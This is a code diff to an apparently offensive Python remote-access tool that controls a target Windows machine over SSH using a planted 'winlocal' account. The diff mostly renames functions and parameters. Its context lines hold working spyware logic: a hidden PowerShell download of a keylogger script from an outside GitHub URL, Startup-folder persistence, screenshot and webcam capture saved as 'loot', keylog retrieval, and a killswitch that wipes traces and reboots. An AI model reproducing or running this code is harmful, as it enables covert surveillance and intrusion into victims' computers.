@@ -45,7 +45,7 @@ options_menu = """
             [install screencapture] -- Install Screen Capture
             [install webcam] --------- Install Webcam capture
             [grab keylogs] ----------- Grab Keylogs
-            [take screenshot] -------- Take Screenshot
+            [grab screenshot] -------- Take Screenshot
             [grab webcam] ------------ Grab Webcam Footage
 
         [+] Options:
@@ -124,14 +124,14 @@ def connect(address, password):
     os.system(f"sshpass -p \"{password}\" ssh winlocal@{address}")
 
 # remote uploads with SCP
-def remote_upload(address, password, upload_file, path):
+def auto_upload(address, password, upload_file, path):
     print("\n[*] Uploading file ... ")
     # scp upload
     os.system(f"sshpass -p \"{password}\" scp {upload_file} winlocal@{address}:{path}")
     print("\n[+] upload complete\n")
 
 # remote downloads with SCP
-def remote_download(address, password, path):
+def auto_download(address, password, path):
     print("\n[*] Downloading file ... ")
     # scp download
     os.system(f"mkdir ~/Download")
@@ -144,12 +144,12 @@ def remote_command(address, password, command):
     os.system(f"sshpass -p \"{password}\" ssh winlocal@{address} \"{command}\"")
 
 # keylogger
-def keylogger(address, password, username, working_directory):
+def keylogger(address, password, target_username, working_directory):
 
     print("\n [*] Prepping keylogger ... ")
     # web requests
     keylogger_command = f"powershell powershell.exe -Windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/paypack/keycap/keycap.ps1 -OutFile {working_directory}/keycap.ps1\""
-    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -Windowstyle hidden $env:temp/keycap.ps1 >> coller.cmd"
+    controller_command = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -Windowstyle hidden $env:temp/keycap.ps1 >> coller.cmd"
     print("\n[+] Keylogger prepped")
 
     # installing keylogger
@@ -163,16 +163,16 @@ def keylogger(address, password, username, working_directory):
     print("\n[!] Restart target computer to execute keylogger ... \n")
 
 # takes screenshot of target computer
-def grab_screenshots (address, password, working_directory, username):
+def grab_screenshots(address, password, working_directory, target_username):
     # download screenshot
     print("\n[*] Downloading screenshots ... ")
     screenshot_location = f"{working_directory}/dshot"
-    remote_download (address, password, screenshot_location)
+    auto_download (address, password, screenshot_location)
     print("[+] Screenshots downloaded")
 
     # formatting screenshots
     print("[*] Fromatting screenshots ")
-    loot_folder = f"dshot-{username}-{current_date()}"
+    loot_folder = f"dshot-{target_username}-{current_date()}"
     os.system(f"mkdir ~/Downloads/{loot_folder}")
     os.system(f"mv ~/Downloads/dshot/* ~/Downloads/{loot_folder}")
     os.system(f"rm -rf ~/Downloads/dshot")
@@ -188,16 +188,16 @@ def grab_screenshots (address, password, working_directory, username):
     print("\n[+] Screenshots saved to \"~/Downloads\"")
 
 # grab webcam footage of target computer
-def grab_webcam(address, password, working_directory, username):
+def grab_webcam(address, password, working_directory, target_username):
     # download webcam footage
     print("\n[*] Downloading webcam footage ... ")
     webcam_location = f"{working_directory}/WCC"
-    remote_download (address, password, webcam_location)
+    auto_download (address, password, webcam_location)
     print("[+] Webcam footage downloaded")
 
     # formatting webcam footage
     print("[*] Fromatting webcam footage ")
-    loot_folder = f"WCC-{username}-{current_date()}"
+    loot_folder = f"WCC-{target_username}-{current_date()}"
     os.system(f"mkdir ~/Downloads/{loot_folder}")
     os.system(f"mv ~/Downloads/WCC/* ~/Downloads/{loot_folder}")
     os.system(f"rm -rf ~/Downloads/WCC")
@@ -213,14 +213,14 @@ def grab_webcam(address, password, working_directory, username):
     print("\n[+] Webcam footage saved to \"~/Downloads\"")
 
 # killswitch
-def killswitch(address, password, working_directory, username):
+def killswitch(address, password, working_directory, target_username):
     print("\n[*] Executing killswitch ... ")
     # web request
     killswitch_command = f"powershell /c cd C:; Remove-Item {working_directory}/* -r -Recurse -Force; Remove-WindowsCapability -Online -Name OpenSSH Server~~~~0.0.1.0; Remove-Item \"C:/Users/winlocal\" -r -Recurse -Force; Remove-LocalUser -Name \"winlocal\"; shutdown /r /t 0"
     print("\n[+] Killswitch prepped")
 
     # installing killswitch
-    remote_command(address, password, f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows/ && cd \"Start Menu\" && cd Programs/Startup && del coller.cmd")
+    remote_command(address, password, f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows/ && cd \"Start Menu\" && cd Programs/Startup && del coller.cmd")
     remote_command(address, password, killswitch_command)
     print("\n[+] Killswitch Executed successfully\n")
 
@@ -233,7 +233,7 @@ def upload(address, password, working_directory):
 
     # upload flie
     print("\n[*] Uploading file ... ")
-    remote_upload(address, password, upload_file, working_directory)
+    auto_upload(address, password, upload_file, working_directory)
     print(f"\n[+] Upload successfully to \"{working_directory}\"\n")
 
 # custom download
@@ -244,7 +244,7 @@ def download(address, password):
 
     # download file
     print("\n[*] Downloading file ... ")
-    remote_download(address, password, download_path)
+    auto_download(address, password, download_path)
 
 # update
 def update():
@@ -330,8 +330,8 @@ def cli(arguments):
                 exit()
 
             # get config info
-            ipv4 = configuration("IPADDRESS")
-            password = configuration("PASSWORD")
+            ipv4 = configuration["IPADDRESS"]
+            password = configuration["PASSWORD"]
             working_directory = configuration.get("WORKINGDIRECTORY")
             startup_directory = configuration.get("STARTUPDIRECTORY")
             target_username = working_directory[9:-19] # gets username from working directory
@@ -350,7 +350,7 @@ def cli(arguments):
 
             # grab keylogs option
             elif option == "grab keylogs":
-                remote_download(ipv4, password, f"{working_directory}/{target_username}.log")
+                auto_download(ipv4, password, f"{working_directory}/{target_username}.log")
                 remote_command(ipv4, password, f"powershell New-Item -Path {working_directory}/{target_username}.log -ItemType File -Force")
 
                 print("[+] Log file saved to \"~/Downloads\"")
